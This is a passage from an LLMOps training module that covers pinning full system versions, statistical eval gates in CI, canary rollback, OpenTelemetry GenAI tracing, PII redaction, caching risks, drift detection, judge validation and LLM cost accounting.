MODULE 2 — LLMOps

Compiled: 4 September 2026. Regulatory dates, product/GA status and pricing retrieved and date-stamped; conflicts between sources are flagged rather than averaged. CONTEXT block: not supplied. Written for general purpose; thresholds are expressed so you can substitute your own QPS, p95 budget and $/1k requests.

Confidence tags: ESTABLISHED replicated/consensus · EMERGING thin evidence · CONTESTED practitioners actively disagree · VENDOR CLAIM asserted by a seller, not independently verified.

#2.0 The one-paragraph version

The artifact you ship is not a model — it's a system version: prompt + model snapshot + retriever config + index build + tool schemas + decoding params. Classical MLOps gave you the right skeleton (registry, lineage, staged rollout, drift monitoring, feedback loops) and the wrong assertions. What breaks is anything that assumed determinism: unit tests become statistical gates, "the model" becomes a vendor endpoint that moves under you, and your dominant production risks shift from data-distribution shift to context rot, prompt injection, and runaway retry cost. Build in this order: (1) trace everything with an ID you can join on, (2) a golden eval set with per-item pass/fail and a defensible judge, (3) pin every version and log the resolved one, (4) an eval gate in CI, (5) canary with automatic rollback, (6) cost attribution per tenant. Everything else is optimisation.

#2.1 The lifecycle: what changed, what didn't

#Decision table — MLOps practice → LLMOps

Classical MLOps practice Status What changes
Model registry Applies, reframed You register a system version, not a model. The model is a foreign key to someone else's artifact
Data/model lineage Applies unchanged Still a legal requirement under EU AI Act Art. 11/17 for high-risk. Now includes prompt lineage and index-build lineage
Staged rollout / canary Applies, harder You cannot assert equality between old and new outputs. Canary compares distributions of scores, not outputs
Shadow deployment Applies, cheaper than you think Shadow is the single best LLMOps practice inherited unchanged — dual-run, score both, never serve the shadow
Feature stores Mostly N/A Replaced by the retrieval index. Same operational concerns (freshness, backfill, point-in-time correctness), different substrate
Training pipelines / retraining triggers Usually N/A Most teams never train. "Retrain" becomes "re-index," "re-tune the prompt," or "migrate the model snapshot"
Data drift monitoring Applies, insufficient Input drift still matters, but the dominant drift vectors are new: retrieval drift and vendor-side model drift on a "pinned" endpoint
Unit tests / deterministic CI Broken Replaced by eval gates with statistical thresholds and n≥3 trials per item
A/B testing Applies, needs more traffic Effect sizes are smaller and variance is higher than in classical ML. Interleaving helps where the output is a ranking
Blue/green + instant rollback Applies, and is your most important control Rollback must revert the whole system version, including index and prompt, not just the deploy
SLOs on latency/error rate Applies, insufficient A system that answers wrong at normal latency with no errors is green on every classical dashboard

#Where the divergence actually bites

The environment is a vendor. In classical MLOps you owned the weights. Now the model is an endpoint behind an alias that the provider may repoint. This is not hypothetical: a 2026 catalogue analysis of "latest"-style floating aliases documents exactly the failure shape teams learned to avoid with Docker's latest and npm caret ranges — a reference that resolves to whatever is newest at call time, with no expiry field and no call-time signal. ESTABLISHED

"Passing" is a distribution, not a boolean. From Module 1: τ-bench's pass^k exists because pass@1 hides non-determinism, and the gap is severe — GPT-4o at 61% pass@1 on retail tasks fell to 25% at pass^8 (arXiv 2406.12045; gap cited in arXiv 2603.29231). Your CI needs the same treatment.

The failure mode is silence. Classical ML degrades with a metric attached. RAG degrades with no errors, normal latency, and confident prose. Everything in §2.4 and §2.6 exists to give silence a signal.

#What most teams get wrong here

They build the eval set last. The order that actually works is: instrument → collect 50–200 real production cases → label them → then start optimising. Teams that optimise first end up with a prompt tuned on the developer's intuition and no way to prove the next change was an improvement. The golden dataset is the asset; the prompt is disposable.

The second error is inherited from MLOps and wrong here: treating "retrain" as the improvement loop. The overwhelming majority of quality improvements in these systems come from retrieval, context assembly and prompt changes. If your lifecycle diagram has a training box in the middle of it and you're calling a vendor API, you've drawn someone else's system.

#2.2 Versioning and the reproducible "system version"

#What must be pinned

Artifact Pin as Failure if unpinned
Model Immutable dated snapshot (e.g. provider-model-YYYYMMDD), never a rolling alias Silent weight/safety-filter changes → JSON schema violations, changed refusal behaviour, eval drift with no deploy
Decoding params temperature, top_p, top_k, max_tokens, seed (where supported), reasoning effort A config-file change reaches prod without an eval. Reasoning-effort defaults changing under a repoint is a documented 2026 case
Prompt Content-hash + semantic version, stored in the repo or a prompt registry with immutable revisions "Someone edited it in the UI" is an unreproducible incident
Tool schemas Versioned, hashed; MCP server pinned by version and description hash Tool descriptions are an instruction channel (Module 1, §1B.5). A changed description is a behaviour change and a security event
Retriever config top_k, fusion weights, RRF k, rerank model + depth, chunker version and params Silent recall change
Embedding model Immutable ID plus dimension, asserted at query time against the index manifest The canonical RAG outage: query encoder upgraded, index not re-encoded, every health check stays 200 while accuracy collapses
Index build Build ID, corpus snapshot ID, ANN params (HNSW M/efConstruction), build timestamp Index rebuilds with subtly different ANN params change neighbour rankings
Eval set Versioned dataset with a changelog; never edited in place You cannot compare this quarter's score to last quarter's if the ruler changed
Judge Judge model snapshot + judge prompt hash Your metric drifts when the judge endpoint drifts. This is the most-missed pin of the lot

#The system-version manifest

Emit this on every request and store it as trace attributes. It is the join key for every other section of this module.

system_version: rag-support-2026.09.04-3
  model:
    id: <immutable-snapshot-id>          # never an alias
    resolved_id: <echoed from API response>   # assert equality; alert on mismatch
    params: {temperature: 0.2, top_p: 1.0, max_tokens: 1024, reasoning: off}
  prompt:
    id: support_answer
    revision: 47
    sha256: 8f3c...
  tools:
    - {name: search_orders, schema_sha256: 1a9b..., mcp_server: null}
    - {name: lookup_policy, schema_sha256: c02d..., mcp_server: {url: ..., version: 2.3.1, desc_sha256: 77ef...}}
  retrieval:
    embed_model: <immutable-id>
    embed_dim: 1024
    index_build: idx-2026-08-30T02:14Z-b7
    corpus_snapshot: corp-2026-08-29
    top_k: 100
    fusion: {method: rrf, k: 60}
    rerank: {model: <pinned>, depth: 100, return: 8}
  judge:                                   # for offline/online scoring runs
    model: <immutable-snapshot-id>
    prompt_sha256: 4d1e...

#Handling the vendor who moves the model under you

Three controls, all cheap, all rarely implemented:

  1. Assert the resolved model ID. Providers echo the served model in the response. Compare it to what you requested on every call; alert on mismatch. A minor version change that doesn't change the public name is otherwise invisible.
  2. Run a nightly canary against the pinned endpoint. A frozen 50-item eval set, same seed, same params, alerting on score movement beyond a threshold. This is the only thing that catches drift on a pinned snapshot (§2.6).
  3. Register your fallback model as a first-class entry. The most common latent failure: the primary is pinned and eval-tested, the fallback is a bare alias that nobody evals and nobody tracks on a deprecation calendar. When the fallback fires — and it does, because primary outages happen — you route to whatever the alias resolves to that day, with no baseline. EMERGING, but the reasoning is airtight and the fix is a config change.

Deprecation is the other half. Pinning buys stability today and creates scheduled migration debt tomorrow; the vendor lifecycle clock keeps running. OpenRouter states that more than 70 models have been pulled or deprecated by providers over recent years — a platform-stated figure not independently verified. VENDOR CLAIM Maintain a deprecation calendar with a named owner per registry entry and a standing migration budget, because the sunset email arrives with a fixed clock and no negotiation.

#What most teams get wrong here

They pin the model and forget the judge. If your quality metric is produced by an LLM judge on an unpinned endpoint, your metric drifts independently of your system, and you will spend a week debugging a regression that was a judge change. Pin the judge snapshot and the judge prompt hash, and re-baseline deliberately when you upgrade either.

The second, more expensive one: prompts live in a SaaS UI, outside code review. A prompt is production logic. It belongs in version control, in the pull request, and in the CI gate — regardless of whether a platform also renders it nicely. Prompt registries with immutable revisions are fine as a serving mechanism; they are not a substitute for review.

#2.3 CI/CD for probabilistic systems

#The gate design

Deterministic assertions and statistical gates are different tools; use both.

Tier 1 — hard assertions (must be 100%, fail the build): - Output parses as valid JSON / conforms to schema - Required fields present; enums in range - No PII in output where prohibited - No forbidden tool call for a given role - Citations resolve to real retrieved chunk IDs (catches fabricated provenance) - Latency p95 and cost per request under ceiling

Tier 2 — statistical gates (thresholds on a scored distribution): - Task success rate on the golden set, reported as pass^k with k≥3, not pass@1 - Retrieval Recall@k and nDCG@k against labelled qrels - Faithfulness / groundedness scores - Refusal rate and over-refusal rate (both directions — a prompt change that makes the model timid passes every other gate) - Safety/jailbreak suite pass rate

Tier 3 — regression-diff gates (the one people skip): - Per-item diff against the previous system version. A net-neutral aggregate score can hide 15% of items regressing and 15% improving. Gate on items that flipped from pass to fail, not just the mean. This is the single highest-value CI check in the list.

#Sizing the gate

Two failure modes: too few trials (noise fails the build) and too few items (you can't detect a real regression).

  • n ≥ 3 trials per item at production temperature. If you run at temperature 0, still run n≥3: providers are not bit-deterministic.
  • Report both mean score and pass^n. Mean tells you capability; pass^n tells you what on-call will experience.
  • Gate on a confidence interval, not a point estimate. Fail when the lower bound of the new version's CI falls below the old version's point estimate.
  • Golden set floor: ~100 items minimum, weighted toward the hard tail. 500+ if the gate blocks releases.

#Deployment progression

PR         → Tier 1 + Tier 2 + Tier 3 on golden set (n=3)      [blocks merge]
Staging    → full regression suite + safety suite (n=5)         [blocks promote]
Shadow     → dual-run on 1–5% of live traffic, score both,      [no user impact]
             NEVER serve shadow output. Compare score
             distributions and cost/latency.
Canary     → 1% → 5% → 25% → 100%, min soak per step            [auto-rollback]
Production → online scoring on a sample + implicit feedback

Shadow is underrated and should be your default for anything risky. It is the only stage where you get real production inputs with zero user exposure, and it is the correct place to catch "this new prompt is fine on the golden set and terrible on the query distribution you actually have."

#Rollback triggers — make them automatic

Define these as code, not as a runbook step:

Trigger Threshold (starting point) Window
Online quality score drop > 2σ below the trailing baseline 30 min rolling
Schema-violation rate > 0.5% 15 min
Tool-error rate > 2× baseline 15 min
Refusal rate > 1.5× baseline (either direction) 30 min
p95 latency > 1.5× baseline 10 min
Cost per request > 1.3× baseline 30 min
Explicit negative feedback rate > 1.5× baseline 60 min
Budget-exhaustion / step-ceiling rate (agents) > 1.5× baseline 30 min

Rollback must revert the whole system version. If the release included a re-index, rolling back the deploy while leaving the new index live gives you a configuration nobody has ever evaluated. Keep the previous index build addressable and switch by pointer.

#A/B and interleaving

  • A/B for end-to-end product metrics (resolution rate, escalation rate, task completion, retention). Slow but authoritative.
  • Interleaving where the output is a ranking — mix results from two retrievers into one list and attribute clicks. Far more sensitive per unit of traffic than A/B, and directly applicable to the retrieval layer.
  • Paired/offline comparison on logged traffic for anything where you can replay: same inputs, two system versions, scored comparison. Cheapest signal per unit of effort.

#What most teams get wrong here

They gate on the mean and ship a regression. Aggregate scores are the wrong resolution for a probabilistic system: two versions can tie on average while the new one breaks a specific class of query that happens to be your highest-value segment. Gate on per-item flips and slice by segment.

Second: the eval set is treated as a fixture instead of a product. It goes stale precisely as fast as your users change, and a stale eval set gives you false green. Budget for continuous promotion of production failures into the golden set (§2.7) and version it with a changelog.

Third, specific and costly: no rollback rehearsal. Practise reverting a system version — including the index pointer — before you need to. The first time most teams discover their index isn't rollback-addressable is during an incident.

#2.4 Observability

#The standard: use it, don't trust its stability yet

OpenTelemetry's GenAI semantic conventions are the right target, with a caveat that most secondary coverage gets wrong.

Status as of mid-2026: every gen_ai.* attribute, span, metric and event carries the stability badge Development — the rung below Alpha, whose own definition says a component should not be used in production and may be removed without notice. The only Stable attributes on a GenAI span (error.type, server.address, server.port) are inherited from core conventions, not written by the GenAI group. In June 2026 the GenAI, provider-specific and MCP conventions were moved into a dedicated repository so they can version independently, and as of 21 August 2026 that repository had no official release. ESTABLISHED — verified against the OTel registry, which now marks the old gen_ai.* entries as "Moved."

Two practical consequences: 1. Don't instrument against a 2025 blog post. Attribute names have been renamed and relocated; several SDKs disagree with each other on the most-used attributes. Write a thin wrapper that owns the attribute constants in one place, plus a span processor that normalises renames at export. That is ~50 lines and it stops your dashboards silently under-counting when one SDK emits a different key. 2. Set the opt-in explicitly. OTEL_SEMCONV_STABILITY_OPT_IN=gen_ai_latest_experimental switches instrumentations from the legacy format to the current one; v1.36 was the transition baseline. Pin your semconv version like any other dependency.

What the conventions now model, and it's the useful part: the whole agent execution as a span tree, not just single LLM calls.

invoke_agent                       (the agent run)
├── chat                           (each model call)
│   └── execute_tool               (each tool invocation)
├── retrieval                      (each retrieval)
├── chat
└── execute_tool

gen_ai.operation.name spans the full lifecycle: create_agent, invoke_agent, invoke_workflow, execute_tool, retrieval, plan, plus memory operations. MCP conventions live in the same repo, so an MCP tool call shares a trace vocabulary with the agent that issued it. Agent spans do not appear automatically — the framework or your instrumentation has to emit them.

#Trace/span design that survives an incident

Non-negotiable attributes on every trace:

trace_id, span_id, parent_span_id
run_id                      # the agent run
step_index                  # position in the loop — makes step repetition queryable
tenant_id, user_id_hashed, session_id
feature / surface           # for cost attribution
system_version.*            # the full manifest from §2.2
gen_ai.request.model, gen_ai.response.model   # requested vs served — assert equality
gen_ai.usage.input_tokens, gen_ai.usage.output_tokens
cache_read_tokens, cache_write_tokens         # cost attribution is wrong without these
retrieval.candidate_ids[], retrieval.scores[], rerank.scores[]
tool.name, tool.args_hash, tool.error_type
budget.steps_used, budget.tokens_used, budget.terminated_by

Two of those repay their cost immediately: step_index + tool.args_hash makes "the agent called the same tool with the same arguments five times" a SQL query instead of an archaeology project; and budget.terminated_by turns "why did this cost $4" into a one-line group-by.

#Sampling: tail-based, or you will lose the incidents

Head sampling at 1% throws away exactly the traces you need. Use tail sampling with policies:

Policy Rate
Errors, tool failures, schema violations 100%
Budget exhaustion / step-ceiling hits 100%
Explicit negative feedback 100%
Low online quality score (bottom decile) 100%
Latency > p99 100%
High cost (> 3× median) 100%
Baseline happy path 1–5%

Agent traces are large — a single run can be 40–75 spans against a chat call's one — which is also why unit-based pricing on trace platforms bites hardest exactly when you're doing agentic work (§2.11).

#PII redaction before storage

The GenAI content-capture problem is unlike classical APM: the payload is the signal. You need prompts and completions to debug, and they are the highest-sensitivity data in your system.

The pattern that holds up: 1. Redact in the SDK/collector, before egress. Not in the backend, not "the vendor deletes it." A processor in your own collector pipeline is the trust boundary. 2. Two-tier storage: redacted content in the general trace store (broad access, long retention); raw content in a separate, short-retention, access-controlled store keyed by trace ID, for a small sampled fraction. 3. Deny-list the obvious sinks: never log full auth headers, API keys, connection strings, or tool arguments containing credentials. Secrets in traces are a real and common finding, because tool arguments get logged wholesale by default instrumentation. 4. Redact tool results too. Teams redact prompts and forget that a database tool result is a row of customer data now sitting in a trace store. 5. Region-pin storage if you have residency obligations — this is the primary reason to self-host (§2.11).

#Cost and token attribution

Attribution requires three dimensions on every span: tenant, feature, and cache state. Without cache_read_tokens/cache_write_tokens your cost model is wrong by up to an order of magnitude on cached workloads (§2.8). Build the rollup as: span-level tokens → run → session → user → tenant → feature → product line. Then publish cost per resolved request per tenant as a first-class dashboard, because that is the number that determines whether the product has unit economics.

#What most teams get wrong here

They instrument the LLM call and nothing else. The LLM span tells you tokens and latency. The failure almost always lives in the spans around it — what was retrieved, what the reranker did, which tool errored, how many steps ran. If retrieval candidate IDs and scores aren't in the trace, you cannot diagnose a bad answer; you can only re-run it and hope.

Second, subtle and expensive: head sampling. Teams set 1% sampling for cost reasons and then cannot debug the incident, because the interesting traces are by definition rare. Tail sampling costs more at the collector and less everywhere else.

Third: redacting at the backend instead of the collector. Once raw prompts have left your network, "the vendor redacts it" is a contractual assurance, not a control. Under a residency or PHI obligation those are not the same thing.

#2.5 Production concerns

#Caching — three distinct layers, ranked by risk

Layer Mechanism Hit rate Correctness risk Effort
Exact-match response cache Byte-identical request → stored response, keyed by (prompt hash, model, params, tenant) 5–20% customer-facing; 30–60% agent inner loops Zero Hours
Prompt / KV caching (provider-side) Reuse the model's KV cache for a stable prefix Depends entirely on prefix discipline Zero Hours to days
Semantic cache Embedding-similarity match above a threshold 20–45% typical; vendor claims of 95% are not what production shows 1–15% false-positive rate depending on threshold Days + a permanent eval loop

#Prompt caching: the highest-ROI cost lever, and the mechanics matter

Anthropic's implementation (verify current details and pricing at docs.claude.com and the pricing page before budgeting — these change with model generations): - Explicit cache_control: {type: "ephemeral"} breakpoints, up to 4 per request - TTL 5 minutes by default, 1 hour optional; writes billed at 1.25× base input (5m) or 2× base input (1h), reads at 0.1× base input - Minimum cacheable length varies by model — commonly cited tables put it at 1,024 to 4,096 tokens depending on the model. Below the threshold, caching is silently skipped with no error - Cache prefixes build in order tools → system → messages; matching is on the prefix, not a substring - Cache reads do not count toward input-token-per-minute rate limits on current models — so caching is also a rate-limit multiplier, not just a cost lever - cache_creation_input_tokens and cache_read_input_tokens in the response are the authoritative hit signal

OpenAI's is automatic prefix caching above a token threshold, with cached prefixes discounted and no separate write surcharge. The structural consequence, which is the part worth internalising: with a write premium, break-even is a function of hits per write cycle. High-hit workloads amortise the write fee away; sporadic traffic doesn't. Model your own hit-per-TTL-window rate before choosing a provider on cache economics. ESTABLISHED on mechanics; pricing figures are widely reported in mid-2026 secondary sources and must be verified against the vendor's own pricing page — several sources disagree on exact rates and they move by model generation.

Prefix discipline is the whole game. One rotating token — a timestamp, a request ID, a user name — placed before your static block invalidates the entire cache on every request, and the failure is silent. The audit is 30 minutes: log cache_read_input_tokens on every call, compute hit rate, and walk the prompt from the top looking for the first thing that varies. Documented production outcomes from raising hit rates (7% → 84% in one reported case, cutting spend 59–70%) are reported by practitioners rather than controlled studies. EMERGING

#Semantic caching: do it last, and only with an eval loop

Reported production threshold range is 0.92–0.97 cosine similarity; below ~0.90 false positives degrade quality, above ~0.98 the cache rarely hits and you've paid for an embedding lookup with nothing back. Reported production hit rates land around 20–45%, not the 95% in vendor materials. EMERGING — practitioner and vendor-adjacent sources, not controlled studies.

The failure mode is a data-leak incident, not a quality dip. "What's the status?" asked by user A about order #4521 and user B about order #7893 produce near-identical embeddings. Without tenant/user/session-scoped cache keys, B gets A's answer. A documented 2026 case has exactly this shape: threshold 0.88, global namespace, a Tier-1 customer's summary served into a Tier-3 customer's session, and a full revert by Friday.

Minimum viable semantic cache: - Cache key includes tenant, user (or explicit "shared-safe" flag), and any binding parameters - Start at 0.97, accept a 5–10% hit rate, and lower only against measured false-positive rate - Sample 1–5% of cache hits into a blind grading loop; compute FP rate weekly; alert on it - Per-category thresholds and TTLs (status lookups can be aggressive; legal/medical/financial cannot) - Measure the marginal gain over exact caching. If semantic adds only 5–8pp over exact, the false-positive risk is not worth the complexity

#Routing, cascades and fallback chains

Model cascade (cheap model first, escalate on low confidence) is a real cost lever and a real quality risk. From Module 1's evidence, the escalation decision is the hard part: a weaker primary is, by construction, bad at knowing when it's out of depth. Make escalation structural rather than self-assessed where you can — escalate on schema-validation failure, low retrieval score, explicit "I don't know," tool error, or a classifier — rather than asking the small model to introspect.

Router (classify then dispatch) beats cascade when query classes are distinguishable up front, because you pay one model call instead of two on the escalation path.

Fallback chain design:

primary   → pinned snapshot, eval-gated, on the deprecation calendar
fallback  → pinned snapshot, eval-gated, on the deprecation calendar   ← the commonly-missed one
degraded  → cached/templated/deterministic response, or explicit failure with provenance

Rules: every tier is a registry entry (§2.2). Fallback triggers on 429/5xx/timeout, not on "the answer looked bad." Log which tier served, and alert when fallback share exceeds a threshold — a silent 30% fallback rate is a quality incident nobody is looking at, because the model behind the fallback was never evaluated for the task.

#Rate limits, quotas, batching, streaming, cold starts

  • Rate limits: implement token-bucket client-side against your known TPM/RPM, with jittered exponential backoff and a circuit breaker. Respect Retry-After. Remember that cached reads may not count toward input-token limits — that changes your effective ceiling materially on cached workloads.
  • Retries are a cost line, not an error-handling detail. A retry storm at the step ceiling is the most common way an LLM bill triples overnight. Cap retries (2), cap the total token budget per run, and make the failure path return partial results with provenance rather than looping.
  • Batch APIs typically offer a large discount for asynchronous work. Every offline job — evals, backfills, index enrichment, contextual-prefix generation, classification — belongs in batch. This is free money that teams leave on the table because the synchronous path already works.
  • Streaming is a latency-perception fix, not a latency fix, and it complicates everything downstream: you cannot validate a schema you haven't finished receiving, guardrails must run on a buffer or post-hoc, and cancellation semantics need explicit handling. Decide up front whether a stream can be retracted; if it can't, don't stream anything that needs validation.
  • Cold starts matter for self-hosted inference (model load, KV cache warm-up, autoscaling lag) and for your own components — an ANN index that mmaps lazily has a first-query cliff. Keep warm pools sized to p99, and warm the index after every rebuild before flipping the pointer.

#Multi-tenancy and noisy neighbours

Four controls, all needed:

  1. Per-tenant quotas on tokens, not requests. One tenant with 200-page documents can consume more capacity than a thousand normal tenants. Requests-per-minute is the wrong unit.
  2. Fairness at the queue. Weighted fair queuing or per-tenant concurrency caps in front of the provider client, so one tenant's burst can't consume the shared TPM allocation.
  3. Tenant isolation in every cache and index. Cache keys, ANN filters, and rerank inputs all carry tenant ID, and ACL filtering is enforced in the index and re-checked after fusion (Module 1, §1A). A retrieval-side leak is a data breach, not a bug.
  4. Cost attribution before you need it. You cannot enforce a quota you can't measure, and you cannot price a product whose per-tenant cost you don't know.

#What most teams get wrong here

They add semantic caching before exact caching and before prompt caching. The ordering is backwards on every axis: exact caching has zero correctness risk and takes hours; prompt caching is the largest cost lever and takes hours; semantic caching has a 1–15% false-positive rate, needs a permanent eval loop, and is the one that produces cross-tenant incidents. Do the two safe ones, measure, and only then decide whether the marginal hit rate is worth the risk.

Second: an unpinned, unevaluated fallback model. It looks like resilience engineering and is actually an untested code path that fires precisely when you're already having a bad day.

#2.6 Drift

#Four distinct drift types — different detectors, different responses

Drift type What moves Detector that fires in time Response
Input drift Query distribution, length, language, topic mix, new intents Embed queries daily, compare distribution to a rolling baseline (PSI / MMD / cluster-share shift); track OOS-router rejection rate; track top-N new clusters Extend the golden set; add a route; retrain the router
Retrieval drift Corpus changes, index rebuild, embedding-model change, chunker change, ANN param change Frozen-query neighbour stability: run the same N queries weekly, measure top-k overlap with baseline. Plus Recall@k on labelled qrels Re-index, re-tune fusion, roll back the index pointer
Model drift on a pinned endpoint The vendor changed something Nightly frozen-eval canary (same items, same seed, same params) + resolved-model-ID assertion Escalate to vendor; pin harder; migrate
Eval-set staleness Your ruler no longer measures what users do Coverage check: what % of last month's production queries fall inside a cluster represented in the golden set? Promote production failures into the set (§2.7)

#Detectors that actually fire in time

Frozen-query neighbour stability is the highest-value RAG drift detector and almost nobody runs it. Take 200 representative queries, store their top-20 retrieved chunk IDs as a baseline, re-run weekly, and measure overlap. Practitioner reports put stable systems around 85–95% neighbour persistence, with drifting systems dropping 25–40% of neighbours silently. EMERGING — practitioner figures, not a controlled study; treat the method as sound and calibrate the threshold on your own system.

Embedding-consistency assertion. Embed a fixed canary document daily with the production encoder and compare to the stored vector. Practitioner-reported ranges: stable ≈ 0.0001–0.005 cosine distance, unstable ≥ 0.05. This catches a silently-swapped or silently-updated embedding model, which is the failure that produces the classic outage: the query encoder is upgraded, the index is not re-encoded, every health check returns 200, and retrieval accuracy collapses with no error. One documented post-mortem puts that single bug at ~$15K of emergency re-encoding plus 2–5 engineer-days to diagnose. EMERGING

The index manifest assertion is the fix, and it's cheap. Store {embed_model_id, dimension, build_id, corpus_snapshot} with the index, and assert the query-time encoder against it on every search. Fail loud on mismatch. This turns a month-long silent degradation into a startup error.

Nightly canary on a pinned endpoint. This is the only detector for vendor-side drift. Frozen items, frozen params, n≥3, alert on movement beyond a threshold. Pair it with the resolved-model-ID check from §2.2 — the ID check catches announced repoints, the canary catches unannounced behaviour changes on the same ID.

#Detectors that don't fire in time (and why)

  • Aggregate online quality score. Too slow and too noisy for gradual drift. It moves after users have already been affected.
  • User complaints. By the time they arrive, drift may have been accumulating for months.
  • Latency/error dashboards. A retrieval system returning the wrong documents at normal speed with no errors is green on every classical panel. This is the defining property of the failure class.

#What most teams get wrong here

They monitor input drift, which is the least important of the four, because it's the one classical MLOps taught them to monitor. The two that actually cause production incidents are retrieval drift and vendor-side model drift, and neither is visible in a feature-distribution dashboard.

The specific, recurring, expensive mistake: shipping an embedding-model upgrade without re-encoding the index. It is silent, it is total, and the assertion that prevents it is fifteen lines of code. If you take one thing from this section, make it the index manifest.

#2.7 Data and feedback loops

#Capture

Implicit signals (free, high volume, weak per-event): - Copy / accept / apply of a suggestion — the strongest implicit positive in most products - Retry, rephrase, or immediate follow-up on the same intent — strong implicit negative - Session abandonment right after a response - Escalation to a human agent — the highest-value negative label in support workloads - Edit distance between the model's draft and what the user actually sent - Tool-call success/failure; downstream transaction completed

Explicit signals (sparse, biased, high value): - Thumbs up/down (expect very low response rates and heavy negativity skew) - Structured reason codes on the down-vote — worth far more than the vote itself, and the single cheapest product change to make feedback usable - Free-text report

Rule: every feedback event carries the trace ID and the full system version. Feedback you cannot join to a trace is a mood ring.

#Promotion: production failure → golden dataset

This pipeline is the actual flywheel, and it is mostly missing in practice.

1. CANDIDATE MINING (automated, daily)
   sources: explicit negatives · escalations · retries · low online scores ·
            schema violations · budget exhaustions · high-cost outliers ·
            random stratified sample (guards against only ever learning from complaints)
2. DEDUPE + CLUSTER
   cluster candidates; pick representatives; avoid a golden set that is 400 copies
   of one bug
3. TRIAGE (human, weekly, ~1 hour)
   → bug (fix now, no dataset entry)
   → known limitation (document, maybe entry)
   → genuine failure case (→ annotate)
   → out of scope (→ router training data)
4. ANNOTATE (see below)
5. SPLIT
   → regression suite (CI gate; must never regress)
   → eval set (tracked, may improve over time)
   → few-shot / fine-tune pool (kept strictly separate from eval)
6. VERSION + CHANGELOG

Leakage discipline: items used as few-shot examples or fine-tuning data must never appear in the eval set. This is elementary and violated constantly, because both pools come from the same mining pipeline.

#Annotation workflow and inter-rater reliability

  • Write the guidelines before labelling, and make them resolve edge cases explicitly. Most disagreement is guideline ambiguity, not rater quality.
  • Double-label 10–20% and compute chance-corrected agreement — Cohen's κ for two raters on categorical labels, Krippendorff's α for more raters or ordinal scales. Report κ, not raw percent agreement.
  • Calibrate expectations. Human inter-annotator agreement for subjective NLG tasks sits around κ = 0.3–0.6; a 2026 study found cross-judge κ = 0.51 landing squarely in that range (arXiv 2606.13685). If your raters are at κ = 0.75 on a subjective rubric, suspect the rubric collapsed the interesting distinctions.
  • Adjudicate disagreements; don't average them. Disagreements are where your rubric is wrong, and averaging destroys that signal.
  • Gold tasks / honeypots at a low rate to detect rater drift over time.

#LLM-as-judge: use it, and know exactly how much to trust it

The strongest recent evidence is a systematic evaluation of 21 judges from nine providers across MT-Bench, JudgeBench and RewardBench — 118 runs, ~541,000 individual judgments, March–April 2026 (arXiv 2606.19544). Four findings that should change your practice:

  1. Kappa deflation is universal: 33–41 percentage points on MT-Bench between exact-match agreement and chance-corrected Cohen's κ. Exact match — the metric almost everyone validates judges with — systematically overstates discriminative ability. ESTABLISHED within the study's scope.
  2. Judge rankings shift by up to 14 positions across benchmarks. "Best judge" does not transfer; validate on your task.
  3. A consistency–bias paradox: two production-deployed judges showed test–retest reliability above 0.95 coexisting with position bias above 0.10. The most reproducible judges were among the least valid. A stable metric is not a correct one.
  4. Verbosity bias was small (<0.011) in their cohort under a single pairing protocol — a useful correction to the folklore that length bias dominates.

The older baseline still holds directionally: GPT-4 judges reached >80% agreement with human preferences on MT-Bench and Chatbot Arena, comparable to human–human agreement (Zheng et al., 2023) — but that figure is computed tie-excluded, and retaining ties and inconsistencies drops it substantially.

Practical judge protocol: - Validate the judge against human labels on your task, reporting κ, not percent agreement - Run paired position swaps on every pairwise comparison and average; report the swap-disagreement rate as a health metric - Pin the judge model snapshot and judge prompt hash (§2.2), and re-baseline when either changes - Prefer reference-guided binary rubrics ("does this answer the question, yes/no, given this reference") over 1–5 Likert scales, which compress badly and inflate agreement - Re-validate periodically: the study's own limitation note flags that judge endpoints drift after the evaluation window

#What most teams get wrong here

They ship thumbs up/down with no reason codes and no trace join, and then discover the feedback is unusable. A down-vote with a reason code and a trace ID is a golden-dataset candidate; a bare down-vote is a number that goes down.

Second: they validate an LLM judge with percent agreement and declare it good. Given 33–41pp of kappa deflation, an "85% agreement" judge can be doing barely better than chance on a skewed benchmark. Report κ and run position swaps, or your entire quality metric is unvalidated.

Third: mining only from complaints. A golden set built purely from negatives teaches you to fix the loud failures and blinds you to a slow regression on the silent majority. Keep a stratified random sample in the mix.

#2.8 Cost engineering

#The accounting identity

Per request, per system version:

cost = Σ_over_llm_calls [
          input_uncached      × p_in
        + input_cache_read    × 0.10 × p_in      (provider-dependent)
        + input_cache_write   × 1.25 × p_in      (5-min TTL; 2× for 1-hour)
        + output_tokens       × p_out
      ] × R                                       R = expected attempts incl. retries
      + retrieval_cost   (vector search + BM25, usually amortised infra)
      + rerank_cost      (per search; watch document-chunk multiplication)
      + embedding_cost   (query-time, plus amortised index build)
      + guardrail/judge cost (online scoring is an LLM call too — meter it)

Compute this at the step ceiling, not the average. Unit economics derived from the happy path are wrong the first time a malformed query drives an agent to its budget limit.

Two derived metrics belong on a dashboard: cost per resolved request (not per API call) and cost per tenant per month against contract value.

#Where the money actually goes

The instinct is that the money is in the model. In these systems it usually isn't — it's in how much text you send it, how many times.

The structural drivers, in rough order of how often they dominate:

  1. Input context volume. RAG systems send large retrieved contexts on every request; agents accumulate context across a loop. Reported industry-wide, average prompt token counts grew roughly 4× between early 2024 and late 2025 (≈1,500 → ≈6,000 tokens per request). EMERGING — secondary source, directionally consistent with everything else.
  2. Repeated static prefixes billed at full price. The system prompt and tool definitions resent uncached on every call. This is the single largest recoverable line item in most bills.
  3. Retries and loops. From Module 1's controlled comparison: agentic RAG consumed 3.3× the input tokens, 1.9× the output tokens and 1.5× the wall-clock of an equivalent enhanced pipeline — with a 3-turn cap. Uncapped, this is unbounded. Multi-agent orchestration runs around 15× the tokens of a chat interaction (Anthropic, vendor-reported).
  4. Output tokens — priced several times input on most providers, so verbose formats, restated context, and reasoning tokens cost disproportionately.
  5. The model tier. Real, but usually the last thing to change, because it trades directly against quality and requires a full eval cycle.

#Levers ranked by savings-per-effort

# Lever Typical saving Effort Risk Notes
1 Prompt/KV caching with prefix discipline Large on stable-prefix workloads (reads at ~0.1× input on explicit-cache providers) Hours None Audit first: log cache-read tokens, find the first varying token
2 Batch API for all offline work Substantial per-token discount on evals, backfills, enrichment Hours None Free money; almost always unclaimed
3 Cap retries, steps and token budget Removes the tail that blows up the bill Hours None Also your top reliability control (Module 1, §1B.7)
4 Exact-match response cache 5–20% customer-facing, 30–60% agent inner loops Hours Zero Tenant-scoped key
5 Trim retrieved context (rerank harder, return fewer) Proportional to token reduction Days Low — often improves quality (context rot) Return 5–8 chunks, not 20
